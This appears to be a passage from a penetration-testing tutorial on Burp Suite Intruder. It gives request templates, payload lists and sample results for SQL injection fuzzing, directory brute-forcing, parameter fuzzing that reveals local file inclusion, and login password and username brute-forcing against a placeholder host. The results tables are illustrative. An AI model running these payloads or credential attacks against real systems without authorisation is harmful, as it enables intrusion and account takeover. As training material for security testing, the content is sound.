### Sending to Intruder

```
# 1. Right click request -> "Send to Intruder"
# 2. Go to Intruder tab
# 3. Click "Positions" tab
# 4. Clear all § markers (click "Clear §")
# 5. Highlight parameter value, click "Add §"
```

### Intruder - SQL Injection Fuzzing

```
**Request Template:**  
┌─────────────────────────────────────────────────────────────────────────────┐  
│ GET /products.php?id=§1§ HTTP/1.1 │  
│ Host: [target.com](https://target.com) │  
└─────────────────────────────────────────────────────────────────────────────┘

**Payloads (Payloads tab):**  
┌─────────────────────────────────────────────────────────────────────────────┐  
│ Simple list: │  
│ 1' │  
│ 1" │  
│ 1 AND 1=1 │  
│ 1 AND 1=2 │  
│ 1 OR 1=1 │  
│ 1' OR '1'='1 │  
│ 1' AND '1'='2 │  
│ 1 UNION SELECT NULL │  
│ 1 UNION SELECT NULL,NULL │  
│ 1' UNION SELECT NULL-- │  
│ 1; SELECT SLEEP(5) │  
│ 1' AND SLEEP(5)-- │  
└─────────────────────────────────────────────────────────────────────────────┘

**Results (Results tab):**  
┌─────────────────────────────────────────────────────────────────────────────┐  
│ Request Payload Status Length Response Time │  
│ 1 1' 500 1245 0.05s │  
│ 2 1" 200 1024 0.03s │  
│ 3 1 AND 1=1 200 1024 0.03s │  
│ 4 1 AND 1=2 200 512 0.02s <- Different length! │  
│ 5 1 OR 1=1 200 2048 0.04s <- Different length! │  
└─────────────────────────────────────────────────────────────────────────────┘
```

### Intruder - Directory Bruteforce

```
**Request Template:**  
┌─────────────────────────────────────────────────────────────────────────────┐  
│ GET /§dir§ HTTP/1.1 │  
│ Host: [target.com](https://target.com) │  
└─────────────────────────────────────────────────────────────────────────────┘

**Payloads (Load wordlist):**  
┌─────────────────────────────────────────────────────────────────────────────┐  
│ Load: /usr/share/wordlists/dirb/common.txt │  
│ │  
│ admin │  
│ login │  
│ wp-admin │  
│ phpmyadmin │  
│ backup │  
│ uploads │  
│ config │  
│ .git │  
│ .env │  
└─────────────────────────────────────────────────────────────────────────────┘

**Results:**  
┌─────────────────────────────────────────────────────────────────────────────┐  
│ Request Payload Status Length Comment │  
│ 1 admin 301 0 Redirect │  
│ 2 login 200 1024 Found! │  
│ 3 wp-admin 403 512 Forbidden │  
│ 4 backup 200 8192 Found! Large response │  
│ 5 .git 403 0 Exposed! │  
└─────────────────────────────────────────────────────────────────────────────┘
```

### Intruder - Parameter Fuzzing

```
**Request Template:**  
┌─────────────────────────────────────────────────────────────────────────────┐  
│ GET /index.php?§param§=1 HTTP/1.1 │  
│ Host: [target.com](https://target.com) │  
└─────────────────────────────────────────────────────────────────────────────┘

**Payloads (Parameter names):**  
┌─────────────────────────────────────────────────────────────────────────────┐  
│ id │  
│ page │  
│ file │  
│ include │  
│ view │  
│ cat │  
│ dir │  
│ path │  
│ document │  
│ folder │  
└─────────────────────────────────────────────────────────────────────────────┘

**Results (Look for different responses):**  
┌─────────────────────────────────────────────────────────────────────────────┐  
│ Request Param Status Length Response Contains │  
│ 1 id 200 1024 "Product:" │  
│ 2 page 200 512 "File not found" │  
│ 3 file 200 8192 "root:x:0:0" <- LFI! │  
└─────────────────────────────────────────────────────────────────────────────┘
```

### Intruder - Password Bruteforce (Login Form)
```
**POST Request Template:**  
┌─────────────────────────────────────────────────────────────────────────────┐  
│ POST /login.php HTTP/1.1 │  
│ Host: [target.com](https://target.com) │  
│ Content-Type: application/x-www-form-urlencoded │  
│ │  
│ user=admin&pass=§pass§ │  
└─────────────────────────────────────────────────────────────────────────────┘

**Payloads (Passwords):**  
┌─────────────────────────────────────────────────────────────────────────────┐  
│ Load from /usr/share/wordlists/rockyou.txt (first 100) │  
│ │  
│ admin │  
│ password │  
│ 123456 │  
│ password123 │  
│ admin123 │  
│ letmein │  
│ qwerty │  
└─────────────────────────────────────────────────────────────────────────────┘

**Results:**  
┌─────────────────────────────────────────────────────────────────────────────┐  
│ Request Password Status Length Response Contains │  
│ 1 admin 200 1024 "Invalid password" │  
│ 2 password 200 1024 "Invalid password" │  
│ 3 123456 200 1024 "Invalid password" │  
│ 4 letmein 302 0 "Location: /dashboard" <- Found! │  
└─────────────────────────────────────────────────────────────────────────────┘

```

### Intruder - Cluster Bomb (Multiple Parameters)

```
**Request Template:**  
┌─────────────────────────────────────────────────────────────────────────────┐  
│ POST /login.php HTTP/1.1 │  
│ Host: [target.com](https://target.com) │  
│ │  
│ user=§user§&pass=§pass§ │  
└─────────────────────────────────────────────────────────────────────────────┘

**Payload Set 1 (Users):**  
┌─────────────────────────────────────────────────────────────────────────────┐  
│ admin │  
│ root │  
│ administrator │  
│ user │  
│ test │  
└─────────────────────────────────────────────────────────────────────────────┘

**Payload Set 2 (Passwords):**  
┌─────────────────────────────────────────────────────────────────────────────┐  
│ admin │  
│ password │  
│ 123456 │  
│ letmein │  
└─────────────────────────────────────────────────────────────────────────────┘

**Results (Tests all combinations):**  
┌─────────────────────────────────────────────────────────────────────────────┐  
│ Req User Pass Status Length │  
│ 1 admin admin 302 0 <- Found! │  
│ 2 admin password 200 1024 │  
│ 3 admin 123456 200 1024 │  
│ 4 root admin 200 1024 │  
│ 5 root password 200 1024 │  
└─────────────────────────────────────────────────────────────────────────────┘
```


### Intruder - Pitchfork (Same Index Parameters)
```
**Request Template:**  
┌─────────────────────────────────────────────────────────────────────────────┐  
│ POST /update.php HTTP/1.1 │  
│ │  
│ user=§user§&id=§id§ │  
└─────────────────────────────────────────────────────────────────────────────┘

**Payload Set 1 (Users):**  
┌─────────────────────────────────────────────────────────────────────────────┐  
│ admin │  
│ user1 │  
│ user2 │  
└─────────────────────────────────────────────────────────────────────────────┘

**Payload Set 2 (IDs):**  
┌─────────────────────────────────────────────────────────────────────────────┐  
│ 1 │  
│ 2 │  
│ 3 │  
└─────────────────────────────────────────────────────────────────────────────┘

**Results (Pairs: admin=1, user1=2, user2=3):**  
┌─────────────────────────────────────────────────────────────────────────────┐  
│ Req User ID Status │  
│ 1 admin 1 200 Success │  
│ 2 user1 2 403 Forbidden │  
│ 3 user2 3 403 Forbidden │  
└─────────────────────────────────────────────────────────────────────────────┘
```

